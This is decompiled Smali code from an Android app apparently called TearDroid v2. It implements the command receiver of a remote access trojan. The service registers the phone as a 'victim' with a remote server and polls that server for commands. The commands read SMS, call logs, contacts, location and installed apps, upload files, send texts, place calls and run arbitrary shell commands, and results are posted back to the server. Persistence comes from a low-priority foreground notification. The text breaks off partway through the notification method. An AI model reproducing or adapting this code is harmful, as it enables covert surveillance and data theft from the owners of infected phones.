.class public final Lcom/example/teardroidv2/CommandReciver;
.super Landroid/app/Service;
.source "CommandReciver.kt"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;
    }
.end annotation

.annotation runtime Lkotlin/Metadata;
    d1 = {
        "\u0000X\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0004\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\u0008\u0003\n\u0002\u0010\u0008\n\u0002\u0008\u0006\n\u0002\u0018\u0002\n\u0002\u0008\u0002\n\u0002\u0018\u0002\n\u0002\u0008\u0003\u0018\u00002\u00020\u0001:\u0001%B\u0005\u00a2\u0006\u0002\u0010\u0002J\u0010\u0010\u000b\u001a\u00020\u000c2\u0006\u0010\r\u001a\u00020\u000eH\u0002J\u0010\u0010\u000f\u001a\u00020\u000c2\u0006\u0010\u0010\u001a\u00020\u0008H\u0002J\u0008\u0010\u0011\u001a\u00020\u0008H\u0002J\u0012\u0010\u0012\u001a\u0004\u0018\u00010\u00132\u0006\u0010\u0014\u001a\u00020\u0015H\u0016J\u0008\u0010\u0016\u001a\u00020\u000cH\u0016J\u0008\u0010\u0017\u001a\u00020\u000cH\u0016J \u0010\u0018\u001a\u00020\u00192\u0006\u0010\u0014\u001a\u00020\u00152\u0006\u0010\u001a\u001a\u00020\u00192\u0006\u0010\u001b\u001a\u00020\u0019H\u0016J\u0012\u0010\u001c\u001a\u00020\u000c2\u0008\u0010\u001d\u001a\u0004\u0018\u00010\u0015H\u0017J\u0010\u0010\u001e\u001a\u00020\u000c2\u0006\u0010\u001f\u001a\u00020 H\u0002J\u0010\u0010!\u001a\u00020\u000c2\u0006\u0010\"\u001a\u00020#H\u0003J\u0008\u0010$\u001a\u00020\u000cH\u0002R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\u0008X\u0082D\u00a2\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006&"
    }
    d2 = {
        "Lcom/example/teardroidv2/CommandReciver;",
        "Landroid/app/Service;",
        "()V",
        "Action",
        "Lcom/example/teardroidv2/Utility;",
        "FileAction",
        "Lcom/example/teardroidv2/FileAction;",
        "TAG",
        "",
        "nReceiver",
        "Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;",
        "commandExecutor",
        "",
        "response",
        "Lorg/json/JSONObject;",
        "commandReciver",
        "victimID",
        "getVictimID",
        "onBind",
        "Landroid/os/IBinder;",
        "intent",
        "Landroid/content/Intent;",
        "onCreate",
        "onDestroy",
        "onStartCommand",
        "",
        "flags",
        "startId",
        "onTaskRemoved",
        "rootIntent",
        "setVictim",
        "VictimDataStore",
        "Landroid/content/SharedPreferences;",
        "startMyOwnForeground",
        "pendingIntent",
        "Landroid/app/PendingIntent;",
        "startNotificationListner",
        "NotificationReceiver",
        "app_release"
    }
    k = 0x1
    mv = {
        0x1,
        0x6,
        0x0
    }
    xi = 0x30
.end annotation


# instance fields
.field private final Action:Lcom/example/teardroidv2/Utility;

.field private final FileAction:Lcom/example/teardroidv2/FileAction;

.field private final TAG:Ljava/lang/String;

.field private final nReceiver:Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;


# direct methods
.method public static synthetic $r8$lambda$hUy3J-YaEtMg8-EA42AW6g8fhy8(Ljava/lang/String;Lcom/example/teardroidv2/CommandReciver;)V
    .locals 0

    invoke-static {p0, p1}, Lcom/example/teardroidv2/CommandReciver;->commandReciver$lambda-1(Ljava/lang/String;Lcom/example/teardroidv2/CommandReciver;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .line 16
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 17
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getTAG()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->TAG:Ljava/lang/String;

    .line 18
    new-instance v0, Lcom/example/teardroidv2/Utility;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    invoke-direct {v0, v1}, Lcom/example/teardroidv2/Utility;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    .line 19
    new-instance v0, Lcom/example/teardroidv2/FileAction;

    invoke-direct {v0, v1}, Lcom/example/teardroidv2/FileAction;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->FileAction:Lcom/example/teardroidv2/FileAction;

    .line 20
    new-instance v0, Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;

    invoke-direct {v0}, Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;-><init>()V

    iput-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->nReceiver:Lcom/example/teardroidv2/CommandReciver$NotificationReceiver;

    return-void
.end method

.method public static final synthetic access$commandExecutor(Lcom/example/teardroidv2/CommandReciver;Lorg/json/JSONObject;)V
    .locals 0

    .line 16
    invoke-direct {p0, p1}, Lcom/example/teardroidv2/CommandReciver;->commandExecutor(Lorg/json/JSONObject;)V

    return-void
.end method

.method public static final synthetic access$commandReciver(Lcom/example/teardroidv2/CommandReciver;Ljava/lang/String;)V
    .locals 0

    .line 16
    invoke-direct {p0, p1}, Lcom/example/teardroidv2/CommandReciver;->commandReciver(Ljava/lang/String;)V

    return-void
.end method

.method private final commandExecutor(Lorg/json/JSONObject;)V
    .locals 14

    const-string v0, "command"

    .line 101
    invoke-virtual {p1, v0}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    .line 102
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v1

    if-eqz v1, :cond_e

    .line 103
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    :goto_0
    if-ge v3, v1, :cond_e

    .line 104
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    .line 105
    invoke-virtual {p1, v3}, Lorg/json/JSONArray;->getJSONObject(I)Lorg/json/JSONObject;

    move-result-object v5

    const-string v6, "key"

    .line 106
    invoke-virtual {v5, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "command_key"

    invoke-virtual {v4, v7, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 108
    :try_start_0
    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_d

    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-string v8, "command.getString(\"number\")"

    const-string v9, "number"

    const/4 v10, 0x0

    const-string v11, "command.getString(\"data\")"

    const-string v12, "data"

    const-string v13, "response"

    sparse-switch v7, :sswitch_data_0

    goto/16 :goto_2

    :sswitch_0
    :try_start_1
    const-string v7, "sendsms"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_0

    goto/16 :goto_2

    .line 117
    :cond_0
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7, v8}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v5, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v11}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v7, v5}, Lcom/example/teardroidv2/Utility;->sendSMS(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_1
    const-string v5, "getcalllogs"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_1

    goto/16 :goto_2

    .line 113
    :cond_1
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->getCallLogs()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_2
    const-string v7, "listfile"

    .line 108
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_2

    goto/16 :goto_2

    .line 112
    :cond_2
    invoke-virtual {v5, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "null"

    invoke-static {v6, v7}, Lkotlin/jvm/internal/Intrinsics;->areEqual(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_3

    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    const/4 v6, 0x1

    invoke-static {v5, v10, v6, v10}, Lcom/example/teardroidv2/Utility;->getFiles$default(Lcom/example/teardroidv2/Utility;Ljava/lang/String;ILjava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    :goto_1
    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :cond_3
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v11}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v5}, Lcom/example/teardroidv2/Utility;->getFiles(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    goto :goto_1

    :sswitch_3
    const-string v7, "runshell"

    .line 108
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_4

    goto/16 :goto_2

    .line 115
    :cond_4
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    const-string v7, "shell"

    invoke-virtual {v5, v7}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    const-string v7, "command.getString(\"shell\")"

    invoke-static {v5, v7}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    const/4 v7, 0x2

    invoke-static {v6, v5, v10, v7, v10}, Lcom/example/teardroidv2/Utility;->runCommand$default(Lcom/example/teardroidv2/Utility;Ljava/lang/String;Ljava/io/File;ILjava/lang/Object;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_4
    const-string v5, "getcontact"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_5

    goto/16 :goto_2

    .line 109
    :cond_5
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->getContact()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_5
    const-string v7, "makecall"

    .line 108
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_6

    goto/16 :goto_2

    .line 118
    :cond_6
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v8}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v5}, Lcom/example/teardroidv2/Utility;->makeCall(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_6
    const-string v7, "getfile"

    .line 108
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_7

    goto/16 :goto_2

    .line 120
    :cond_7
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->FileAction:Lcom/example/teardroidv2/FileAction;

    invoke-virtual {v5, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v11}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v5}, Lcom/example/teardroidv2/FileAction;->uploadFile(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_7
    const-string v5, "getapps"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_8

    goto/16 :goto_2

    .line 110
    :cond_8
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->installedApps()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto/16 :goto_2

    :sswitch_8
    const-string v5, "getlocation"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_9

    goto :goto_2

    .line 119
    :cond_9
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->getLocation()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_2

    :sswitch_9
    const-string v7, "changewallpaper"

    .line 108
    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_a

    goto :goto_2

    .line 116
    :cond_a
    iget-object v6, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5, v12}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-static {v5, v11}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    invoke-virtual {v6, v5}, Lcom/example/teardroidv2/Utility;->changeWallpaper(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_2

    :sswitch_a
    const-string v5, "getservices"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_b

    goto :goto_2

    .line 114
    :cond_b
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->getServices()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    goto :goto_2

    :sswitch_b
    const-string v5, "getsms"

    .line 108
    invoke-virtual {v6, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-nez v5, :cond_c

    goto :goto_2

    .line 111
    :cond_c
    iget-object v5, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v5}, Lcom/example/teardroidv2/Utility;->getSms()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v13, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_2

    :catch_0
    move-exception v5

    const-string v6, "success"

    .line 123
    invoke-virtual {v4, v6, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 124
    sget-object v6, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v6}, Lcom/example/teardroidv2/AppInfo;->getTAG()Ljava/lang/String;

    move-result-object v6

    new-instance v7, Ljava/lang/StringBuilder;

    const-string v8, "Error => "

    invoke-direct {v7, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-static {v6, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 126
    :cond_d
    :goto_2
    new-instance v5, LRequest;

    .line 130
    sget-object v6, Lcom/example/teardroidv2/CommandReciver$commandExecutor$1;->INSTANCE:Lcom/example/teardroidv2/CommandReciver$commandExecutor$1;

    check-cast v6, Lkotlin/jvm/functions/Function1;

    sget-object v7, Lcom/example/teardroidv2/CommandReciver$commandExecutor$2;->INSTANCE:Lcom/example/teardroidv2/CommandReciver$commandExecutor$2;

    check-cast v7, Lkotlin/jvm/functions/Function1;

    const-string v8, "/command/complete"

    .line 126
    invoke-direct {v5, v8, v6, v7}, LRequest;-><init>(Ljava/lang/String;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;)V

    .line 130
    invoke-virtual {v5, v4}, LRequest;->post(Lorg/json/JSONObject;)V

    add-int/lit8 v3, v3, 0x1

    goto/16 :goto_0

    :cond_e
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x4a7719bd -> :sswitch_b
        -0x35cb164c -> :sswitch_a
        -0x2f2ddfae -> :sswitch_9
        -0x16b086f5 -> :sswitch_8
        -0x4744138 -> :sswitch_7
        -0x472162e -> :sswitch_6
        0x270d94c -> :sswitch_5
        0x134bc80a -> :sswitch_4
        0x31b98285 -> :sswitch_3
        0x503d271a -> :sswitch_2
        0x6dc0ba63 -> :sswitch_1
        0x760360d1 -> :sswitch_0
    .end sparse-switch
.end method

.method private final commandReciver(Ljava/lang/String;)V
    .locals 2

    .line 85
    sget-object v0, LRequest;->Companion:LRequest$Companion;

    move-object v1, p0

    check-cast v1, Landroid/content/Context;

    invoke-virtual {v0, v1}, LRequest$Companion;->init(Landroid/content/Context;)V

    .line 86
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/example/teardroidv2/CommandReciver$$ExternalSyntheticLambda0;

    invoke-direct {v1, p1, p0}, Lcom/example/teardroidv2/CommandReciver$$ExternalSyntheticLambda0;-><init>(Ljava/lang/String;Lcom/example/teardroidv2/CommandReciver;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 96
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private static final commandReciver$lambda-1(Ljava/lang/String;Lcom/example/teardroidv2/CommandReciver;)V
    .locals 4

    const-string v0, "$victimID"

    invoke-static {p0, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    const-string v0, "this$0"

    invoke-static {p1, v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullParameter(Ljava/lang/Object;Ljava/lang/String;)V

    .line 88
    :goto_0
    new-instance v0, LRequest;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "/command/device/"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 92
    new-instance v2, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;

    invoke-direct {v2, p1}, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$1;-><init>(Lcom/example/teardroidv2/CommandReciver;)V

    check-cast v2, Lkotlin/jvm/functions/Function1;

    new-instance v3, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$2;

    invoke-direct {v3, p0}, Lcom/example/teardroidv2/CommandReciver$commandReciver$thread$1$2;-><init>(Ljava/lang/String;)V

    check-cast v3, Lkotlin/jvm/functions/Function1;

    .line 88
    invoke-direct {v0, v1, v2, v3}, LRequest;-><init>(Ljava/lang/String;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;)V

    .line 92
    invoke-virtual {v0}, LRequest;->get()V

    const-wide/16 v0, 0xbb8

    .line 93
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    goto :goto_0
.end method

.method private final getVictimID()Ljava/lang/String;
    .locals 3

    .line 142
    sget-object v0, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v0}, Lcom/example/teardroidv2/AppInfo;->getVictimDatastore()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/teardroidv2/CommandReciver;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 143
    sget-object v1, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v1}, Lcom/example/teardroidv2/AppInfo;->getVictimID()Ljava/lang/String;

    move-result-object v1

    const-string v2, "invalid ID"

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lkotlin/jvm/internal/Intrinsics;->checkNotNull(Ljava/lang/Object;)V

    return-object v0
.end method

.method private final setVictim(Landroid/content/SharedPreferences;)V
    .locals 4

    .line 147
    iget-object v0, p0, Lcom/example/teardroidv2/CommandReciver;->Action:Lcom/example/teardroidv2/Utility;

    invoke-virtual {v0}, Lcom/example/teardroidv2/Utility;->addClient()Lorg/json/JSONObject;

    move-result-object v0

    .line 148
    new-instance v1, LRequest;

    .line 155
    new-instance v2, Lcom/example/teardroidv2/CommandReciver$setVictim$1;

    invoke-direct {v2, p1, p0}, Lcom/example/teardroidv2/CommandReciver$setVictim$1;-><init>(Landroid/content/SharedPreferences;Lcom/example/teardroidv2/CommandReciver;)V

    check-cast v2, Lkotlin/jvm/functions/Function1;

    sget-object p1, Lcom/example/teardroidv2/CommandReciver$setVictim$2;->INSTANCE:Lcom/example/teardroidv2/CommandReciver$setVictim$2;

    check-cast p1, Lkotlin/jvm/functions/Function1;

    const-string v3, "/client/add"

    .line 148
    invoke-direct {v1, v3, v2, p1}, LRequest;-><init>(Ljava/lang/String;Lkotlin/jvm/functions/Function1;Lkotlin/jvm/functions/Function1;)V

    .line 155
    invoke-virtual {v1, v0}, LRequest;->post(Lorg/json/JSONObject;)V

    return-void
.end method

.method private final startMyOwnForeground(Landroid/app/PendingIntent;)V
    .locals 5

    .line 52
    new-instance v0, Landroid/app/NotificationChannel;

    const-string v1, "Background Service"

    .line 54
    check-cast v1, Ljava/lang/CharSequence;

    const-string v2, "com.example.teardroid_v2"

    const/4 v3, 0x0

    .line 52
    invoke-direct {v0, v2, v1, v3}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    .line 57
    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->enableLights(Z)V

    .line 58
    invoke-virtual {v0, v3}, Landroid/app/NotificationChannel;->setLockscreenVisibility(I)V

    const-string v1, "notification"

    .line 59
    invoke-virtual {p0, v1}, Lcom/example/teardroidv2/CommandReciver;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v1

    if-eqz v1, :cond_0

    check-cast v1, Landroid/app/NotificationManager;

    .line 60
    invoke-virtual {v1, v0}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V

    .line 61
    new-instance v0, Landroidx/core/app/NotificationCompat$Builder;

    move-object v4, p0

    check-cast v4, Landroid/content/Context;

    invoke-direct {v0, v4, v2}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const/4 v2, 0x1

    .line 62
    invoke-virtual {v0, v2}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 63
    sget-object v4, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v4}, Lcom/example/teardroidv2/AppInfo;->getNotificationTitle()Ljava/lang/String;

    move-result-object v4

    check-cast v4, Ljava/lang/CharSequence;

    invoke-virtual {v2, v4}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 64
    sget-object v4, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v4}, Lcom/example/teardroidv2/AppInfo;->getNotificationContent()Ljava/lang/String;

    move-result-object v4

    check-cast v4, Ljava/lang/CharSequence;

    invoke-virtual {v2, v4}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 65
    sget-object v4, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v4}, Lcom/example/teardroidv2/AppInfo;->getNotificationSubText()Ljava/lang/String;

    move-result-object v4

    check-cast v4, Ljava/lang/CharSequence;

    invoke-virtual {v2, v4}, Landroidx/core/app/NotificationCompat$Builder;->setSubText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 66
    invoke-virtual {v2, v3}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    const-string v3, "service"

    .line 67
    invoke-virtual {v2, v3}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 68
    invoke-virtual {v2, p1}, Landroidx/core/app/NotificationCompat$Builder;->setContentIntent(Landroid/app/PendingIntent;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v2

    .line 69
    invoke-virtual {v2}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v2

    const-string v4, "notificationBuilder.setO\u2026ent)\n            .build()"

    invoke-static {v2, v4}, Lkotlin/jvm/internal/Intrinsics;->checkNotNullExpressionValue(Ljava/lang/Object;Ljava/lang/String;)V

    const/16 v4, 0x539

    .line 70
    invoke-virtual {p0, v4, v2}, Lcom/example/teardroidv2/CommandReciver;->startForeground(ILandroid/app/Notification;)V

    .line 72
    sget-object v2, Lcom/example/teardroidv2/AppInfo;->INSTANCE:Lcom/example/teardroidv2/AppInfo;

    invoke-virtual {v2}, Lcom/example/teardroidv2/AppInfo;->getNotificationTitle()Ljava/lang/String;

    move-result-object v2

